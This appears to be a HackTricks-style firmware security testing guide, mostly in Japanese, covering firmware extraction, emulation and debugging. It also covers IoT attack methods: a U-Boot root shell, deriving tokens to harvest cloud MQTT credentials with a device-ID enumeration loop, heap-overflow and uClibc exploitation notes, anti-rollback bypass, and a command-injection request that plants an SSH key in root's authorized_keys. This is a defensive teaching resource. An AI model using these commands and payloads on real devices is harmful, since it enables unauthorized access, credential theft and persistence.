# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware は、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・促進することで、デバイスを正しく動作させるための必須ソフトウェアです。これは不揮発性メモリに保存されており、デバイスは電源投入直後から重要な命令にアクセスでき、その結果としてオペレーティングシステムの起動につながります。Firmware を調査し、場合によっては改変することは、セキュリティ脆弱性を特定するうえで重要なステップです。

## **Gathering Information**

**Gathering information** は、デバイスの構成や使用している技術を理解するための重要な最初のステップです。このプロセスでは、次の情報を収集します。

- CPU architecture と実行している operating system
- Bootloader の詳細
- Hardware layout と datasheets
- Codebase の指標とソースの場所
- 外部ライブラリとライセンス種別
- Update 履歴と規制認証
- アーキテクチャ図とフローチャート
- セキュリティ評価と特定済みの脆弱性

この目的では、**open-source intelligence (OSINT)** ツールが非常に有用であり、利用可能な open-source software コンポーネントを手動および自動のレビュー գործընթացを通じて分析することも重要です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) のようなツールは、潜在的な問題を見つけるために活用できる無料の static analysis を提供します。

## **Acquiring the Firmware**

Firmware を入手する方法はいくつかあり、それぞれ複雑さが異なります。

- ソース（developers, manufacturers）から**直接**
- 提供された手順に従って**ビルド**
- 公式サポートサイトから**ダウンロード**
- ホストされている firmware ファイルを見つけるために **Google dork** クエリを利用
- [S3Scanner](https://github.com/sa7mon/S3Scanner) のようなツールで **cloud storage** に直接アクセス
- man-in-the-middle 手法で **updates** を傍受
- **UART**, **JTAG**, または **PICit** のような接続を通じてデバイスから**抽出**
- デバイス通信内の update 要求を**sniffing**
- **ハードコードされた update endpoint** を特定して利用
- **bootloader** または network からの**dumping**
- 他の方法がすべて失敗した場合は、適切な hardware tools を使って storage chip を**取り外して読み取り**

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
それらのツールであまり見つからない場合は、`binwalk -E <bin>` で画像の **entropy** を確認してください。entropy が低ければ、暗号化されている可能性は低いです。entropy が高ければ、暗号化されているか、何らかの形で圧縮されている可能性が高いです。

さらに、これらのツールを使って firmware 内に埋め込まれた **files** を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使って file を調べられます。

### Getting the Filesystem

前述の `binwalk -ev <bin>` のようなツールを使えば、**filesystem を抽出**できているはずです。\
Binwalk は通常、filesystem type の **folder** に展開します。これは通常、次のいずれかです: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs。

#### Manual Filesystem Extraction

場合によっては、binwalk に filesystem の magic byte が signature として含まれていないことがあります。その場合は、binwalk を使って binary 内の filesystem の offset を見つけ、圧縮された filesystem を carve し、以下の手順に従ってその type に応じて filesystem を **manual に抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem を carving するために、以下の **dd command** を実行します。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
また、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリに配置されます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使う ubifs filesystems の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために、必ず分解して調べることが重要です。このプロセスでは、さまざまなツールを使ってファームウェアイメージを解析し、価値のあるデータを抽出します。

### 初期分析ツール

バイナリファイル（`<bin>` と表記）の初期調査のためのコマンド一式が用意されています。これらのコマンドは、ファイルタイプの特定、文字列の抽出、バイナリデータの解析、パーティションと filesystem の詳細の把握に役立ちます。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するには、`binwalk -E <bin>` で **entropy** を確認します。entropy が低い場合は暗号化されていないことを示し、entropy が高い場合は暗号化または圧縮の可能性を示します。

**embedded files** を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル確認用の **binvis.io** などのツールとリソースが推奨されます。

### Filesystem の抽出

`binwalk -ev <bin>` を使うと、通常は filesystem を抽出でき、しばしば filesystem type にちなんだ名前のディレクトリ（例: squashfs, ubifs）に展開されます。ただし、magic bytes が欠落しているために **binwalk** が filesystem type を認識できない場合は、手動での抽出が必要です。これは、`binwalk` を使って filesystem の offset を特定し、その後 `dd` コマンドで filesystem を切り出すことで行います:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、filesystem の種類（例: squashfs, cpio, jffs2, ubifs）に応じて、内容を手動で抽出するために異なるコマンドが使用されます。

### Filesystem Analysis

filesystem を抽出したら、security flaws の探索を開始します。secure でない network daemons、hardcoded credentials、API endpoints、update server 機能、未コンパイルの code、startup scripts、そして offline analysis 用の compiled binaries に注意を払います。

**Key locations** と **items** として確認すべきものは以下です:

- ユーザー credentials のための **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL certificates と keys
- 潜在的な vulnerabilities を含む configuration file と script file
- さらに分析するための embedded binaries
- 一般的な IoT device の web servers と binaries

いくつかの tools が、filesystem 内の機密情報や vulnerabilities の発見を支援します:

- 機密情報検索のための [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware analysis のための [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static および dynamic analysis のための [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), および [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries に対する Security Checks

filesystem 内で見つかった source code と compiled binaries の両方は、vulnerabilities の有無を厳密に調べる必要があります。Unix binaries 向けの **checksec.sh** や Windows binaries 向けの **PESecurity** のような tools は、悪用可能な保護されていない binaries の特定に役立ちます。

## 生成された URL token を介した cloud config と MQTT credentials の収集

多くの IoT hubs は、各 device ごとの configuration を次のような cloud endpoint から取得します:

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 中に、`<token>` が hardcoded secret を使って device ID からローカルに生成されていることがあります。たとえば:

- token = MD5( deviceId || STATIC_KEY ) で、uppercase hex で表現される

この設計により、deviceId と STATIC_KEY を知った者は誰でも URL を再構成して cloud config を取得でき、しばしば plaintext の MQTT credentials と topic prefixes が明らかになります。

実用的な workflow:

1) UART boot logs から deviceId を抽出する

- 3.3V UART adapter（TX/RX/GND）を接続し、logs を取得します:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URLパターンとbroker addressを出力している行を探してください。例えば：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm を復元する

- binaries を Ghidra/radare2 に読み込み、config path ("/pf/") または MD5 使用箇所を search する。
- algorithm を確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash で token を導出し、digest を uppercase する:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials を収集する

- URL を組み立てて curl で JSON を取得し、jq で parse して secrets を抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT と weak topic ACLs（存在する場合）を悪用する

- 復元した credentials を使って maintenance topics に subscribe し、sensitive events を探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能な device ID を列挙する（大規模に、許可を得て）

- 多くのエコシステムでは、vendor OUI/product/type バイトの後に連番の suffix が埋め込まれています。
- 候補 ID を順に試し、token を導出して、config をプログラムで取得できます:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 大量列挙を試みる前に、必ず明示的な認可を得ること。
- 可能な場合は、対象ハードウェアを変更せずに secrets を回収するため、emulation または static analysis を優先すること。


firmware を emulating するプロセスにより、デバイスの動作または個々の program の **dynamic analysis** が可能になる。このアプローチでは hardware や architecture 依存の問題に直面することがあるが、root filesystem または特定の binaries を、Raspberry Pi のような architecture と endianness が一致する device、または事前に構築された virtual machine に移すことで、さらなる testing を進めやすくなる。

### Emulating Individual Binaries

単一の programs を調べる場合、program の endianness と CPU architecture を特定することが重要である。

#### Example with MIPS Architecture

MIPS architecture binary を emulating するには、次の command を使える:
```bash
file ./squashfs-root/bin/busybox
```
必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) では、`qemu-mips` が使われ、little-endian binaries では `qemu-mipsel` を選ぶのが適切です。

#### ARM Architecture Emulation

ARM binaries では手順は同様で、`qemu-arm` emulator を使って emulation を行います。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)、その他の tool は full firmware emulation を容易にし、process を自動化して dynamic analysis を支援します。

## Dynamic Analysis in Practice

この段階では、実機または emulated device environment のどちらかを analysis に使用します。OS と filesystem への shell access を維持することが重要です。Emulation は hardware interactions を完全には再現できない場合があり、そのため時々 emulation の再起動が必要になります。Analysis では filesystem を再確認し、公開されている webpages や network services を exploit し、bootloader vulnerabilities を調査するべきです。Firmware integrity tests は、潜在的な backdoor vulnerabilities を特定するために重要です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などの tools を使って、その operating environment 上で process または binary と interaction し、breakpoint を設定したり fuzzing やその他の techniques によって vulnerabilities を特定したりします。

完全な debugger がない embedded targets では、**statistically-linked `gdbserver` を device に copy** し、remote で attach します:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubでは、RF stackはしばしば **radio MCU** と Linux userland process の間で分割されています。役立つワークフローは、次の経路をマップすることです:

1. **RF frame** on the air
2. radio MCU 上の **controller-side parser**
3. Linux に転送される **serial/UART text or TLV protocol**（例: `/dev/tty*`）
4. main daemon 内の **application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャは、1つではなく2つの reversing 対象を作ります。controller が binary radio frames を `Group,Command,arg1,arg2,...` のような textual protocol に変換する場合は、次を復元します:

- **message groups** と dispatch tables
- どの messages が **network** 由来で、どれが controller 自身から来るのか
- 正確な **manufacturer-specific discriminator fields**（例: Zigbee `manufacturer_code` と custom `cluster_command`）
- **commissioning**, discovery, firmware/model download phases の間にのみ到達可能な handler

Zigbee については特に、pairing traffic を capture し、対象がまだデフォルトの **Link Key** `ZigBeeAlliance09` に依存しているか確認します。そうであれば、commissioning traffic の sniffing で **Network Key** が露出する可能性があります。Zigbee 3.0 の install codes はこの露出を減らすので、テスト対象デバイスが実際にそれらを強制しているかを記録してください。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific な Zigbee/ZCL commands は、標準化された clusters よりも良い標的になることが多いです。なぜなら、それらは **custom parsing code** と内部の **FSMs** に入り、十分に実戦テストされていない validation が少ないからです。

実践的な workflow:

- command dispatcher を逆解析し、**vendor-only handler** を見つける。
- **FSM state**, **event**, **check**, **action**, **next-state** tables を復元する。
- 自動で進む **transitional states** と、最終的に attacker-controlled state を reset するか free する retry/error branches を特定する。
- バグのある handler が常に到達可能だと決めつけず、脆弱な state に daemon を置くために必要な正当な protocol exchanges を確認する。

タイミングに敏感な protocol では、Python framework からの packet replay は遅すぎることがあります。より信頼できる方法は、実機上で正当な device を emulation することです（例: **nRF52840**）vendor-grade stack を使い、正しい **endpoints**, **attributes**, commissioning timing を露出させます。

### Fragmented-download bug class in embedded daemons

繰り返し見られる firmware bug class は **fragmented blob/model/configuration downloads** に現れます:

1. **first fragment** (`offset == 0`) が `ctx->total_size` を保存し、`malloc(total_size)` を確保する。
2. 後続の fragments は、攻撃者が制御する **packet-local** fields、例えば `packet_total_size >= offset + chunk_len` だけを検証する。
3. copy は **original allocated size** を確認せずに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を使う。

これにより、攻撃者は次のように送信できます:

- **small** な宣言 total size を持つ最初の有効 fragment を送り、小さな heap allocation を強制する。
- **expected offset** を持ちつつ、より大きい `chunk_len` の後続 fragment を送る。
- fresh checks を満たしつつ、元の allocated buffer を overflow する forged packet-local size。

脆弱な path が commissioning logic の背後にある場合、exploit には、壊れた fragments を送る前に対象を期待される model-download または blob-download state に導くための十分な **device emulation** が必要です。

### Protocol-driven `free()` triggers

embedded daemons では、heap metadata exploitation を引き起こす最も簡単な方法は、しばしば「cleanup を待つ」ことではなく、**protocol の error handling を強制する**ことです:

- malformed な follow-up fragments を送って FSM を **retry** または **error** states に押し込む。
- retry threshold を超えさせて daemon に **reset context** させ、破損した buffer を free させる。
- この予測可能な `free()` を使って、process が別の理由で crash する前に allocator-side primitives を引き起こす。

これは特に embedded Linux の **musl/uClibc/dlmalloc-like** allocators に対して有用です。chunk metadata を破壊すると、unlink/unbin logic を write primitive に変えられるからです。安定した pattern は、`size` field を破壊して allocator traversal を overflowed buffer 内に staged された **fake chunks** に向けることです。real な bin pointers を即座に壊して process を crash させるよりも有効です。

## Binary Exploitation and Proof-of-Concept

特定された脆弱性の PoC を開発するには、target architecture の深い理解と lower-level languages での programming が必要です。embedded systems の binary runtime protections はまれですが、存在する場合は Return Oriented Programming (ROP) のような techniques が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc は glibc に似た fastbins を使います。後の large allocation が `__malloc_consolidate()` を trigger することがあるため、fake chunk は checks（妥当な size、`fd = 0`、周囲の chunks が "in use" と見なされること）を生き残らなければなりません。
- **Non-PIE binaries under ASLR:** ASLR が有効でも main binary が **non-PIE** なら、binary 内の `.data/.bss` addresses は安定しています。valid な heap chunk header に似た領域を狙って、fastbin allocation を **function pointer table** に着地させられます。
- **Parser-stopping NUL:** JSON が parse されるとき、payload 内の `\x00` は parsing を止めつつ、末尾の attacker-controlled bytes を stack pivot/ROP chain 用に残せます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, `write()` を呼ぶ ROP chain により、既知の mapping に executable shellcode を植え込み、それへ jump できます。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような operating systems は、必要な tools を備えた firmware security testing 用の pre-configured environments を提供します。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) devices に対して security assessment と penetration testing を行うのを支援するための distro です。必要な tools をすべて loaded した pre-configured environment を提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools を preloaded した Ubuntu 18.04 ベースの embedded security testing operating system です。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor が firmware images に対して cryptographic signature checks を実装していても、**version rollback (downgrade) protection** はしばしば省略されます。boot- または recovery-loader が embedded public key で signature だけを verify し、flash される image の *version*（または monotonic counter）を比較しない場合、攻撃者は valid signature を持つ **older, vulnerable firmware** を正当に install でき、修正済みの vulnerabilities を再導入できます。

Typical attack workflow:

1. **Obtain an older signed image**
* vendor の public download portal, CDN, または support site から取得する。
* companion mobile/desktop applications から抽出する（例: Android APK の `assets/firmware/` 内）。
* VirusTotal, Internet archives, forums などの third-party repositories から取得する。
2. **Upload or serve the image to the device** を exposed された update channel 経由で行う:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* 多くの consumer IoT devices は、Base64-encoded firmware blobs を受け付け、server-side で decode して recovery/upgrade を trigger する *unauthenticated* HTTP(S) endpoints を公開しています。
3. downgrade 後、新しい release で修正された脆弱性を exploit する（例: 後から追加された command-injection filter）。
4. 必要なら最新 image を再度 flash するか、updates を無効化して persistence 取得後の detection を避ける。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）firmwareでは、`md5` パラメータがサニタイズされずに shell command に直接連結されており、任意の commands の injection が可能です（ここでは、SSH key-based root access を有効化）。後続の firmware versions では基本的な文字フィルタが導入されましたが、downgrade protection が存在しないため、その修正は無意味です。

### モバイルアプリから firmware を抽出する

多くの vendor は、付属の mobile application 内に full firmware images を同梱しており、アプリが Bluetooth/Wi-Fi 経由で device を update できるようにしています。これらの packages は通常、APK/APEX 内の `assets/fw/` や `res/raw/` のような paths に unencrypted のまま保存されています。`apktool`、`ghidra`、あるいは単純な `unzip` のような tools を使えば、physical hardware に触れずに signed images を取り出せます。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot designs における updater-only anti-rollback bypass

一部のベンダーは anti-downgrade **ratchet** を実装していますが、*updater* ロジック内だけに限定されている場合があります（たとえば CAN 上の UDS routine、recovery コマンド、または userspace の OTA agent）。その後で **bootloader** がイメージの signature/CRC だけを確認し、partition table や slot metadata を信頼してしまうと、rollback protection は依然として bypass されます。

典型的な弱い設計:

- Firmware metadata に version descriptor と **security ratchet** / monotonic counter の両方が含まれる。
- updater は image ratchet を persistent storage に保存された値と比較し、古い signed images を拒否する。
- bootloader はその ratchet を **解析せず**、選択された slot を boot する前に header、CRC、signature だけを verify する。
- Slot activation は partition table または per-slot generation counter に別個に保存され、検証された正確な firmware digest に **cryptographically bound** されていない。

これにより、dual-slot systems では **validate-one-image / boot-another-image** という primitive が生まれます。攻撃者が current signed image を使って updater に slot B を次の boot target としてマークさせ、その後 reboot 前に slot B を上書きできると、bootloader はすでに committed された slot metadata だけを信頼するため、downgraded image を boot してしまう可能性があります。

よくある abuse pattern:

1. current signed firmware を passive slot に upload し、通常の validation/switch routine を実行して、その slot が next active として layout にマークされるようにする。
2. まだ reboot しない。**同じセッション**で slot-preparation/erase routine に再度入る。
3. stale boot-state または stale slot-selection logic を悪用して、updater によって直前に昇格された **同じ physical slot** を erase させる。
4. その slot に **より古いが still signed** な firmware を書き込む。
5. ratchet を enforce する validation routine をスキップし、そのまま reboot する。
6. bootloader は昇格済みの slot を選択し、signature/integrity のみを verify して、古い image を boot する。

A/B update implementations を reverse する際に確認すべき点:

- **boot-time flags** から導かれる slot selection が、成功した switch 後に refresh されない。
- `prepare_passive_slot()` のような routine が、**current committed layout** ではなく stale state を基に slot を erase する。
- `part_write_layout()` のような function が **generation counter** / active flag だけを増やし、validated image hash を保存しない。
- ratchet checks が userspace または updater code に実装されているが、ROM / bootloader / secure boot stages には **ない**。
- erase や recovery routines が、内容を削除・再書き込みした後でも slot を bootable のままにしてしまう。

### Update Logic を評価するための Checklist

* *update endpoint* の transport/authentication は十分に保護されているか（TLS + authentication）？
* device は flashing 前に **version numbers** または **monotonic anti-rollback counter** を比較しているか？
* image は secure boot chain 内で verify されているか（例: ROM code による signature check）？
* **bootloader** は updater と同じ ratchet を enforce しているか、それとも signature/CRC だけを check しているか？
* slot activation metadata は検証済み firmware digest/version に **bound** されているか、あるいは promotion 後に slot を変更できるか？
* slot switch 成功後、device は強制 reboot されるか、それとも同じセッションで後続の update/erase routines にまだ到達できるか？
* userland code は追加の sanity checks を実施しているか（例: allowed partition map、model number）？
* *partial* または *backup* update flows は同じ validation logic を再利用しているか？

> 💡  上記のいずれかが欠けている場合、その platform は rollback attacks に脆弱である可能性が高いです。

## 練習用の Vulnerable firmware

Firmware の脆弱性発見を練習するには、以下の vulnerable firmware projects を出発点として使ってください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Training and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
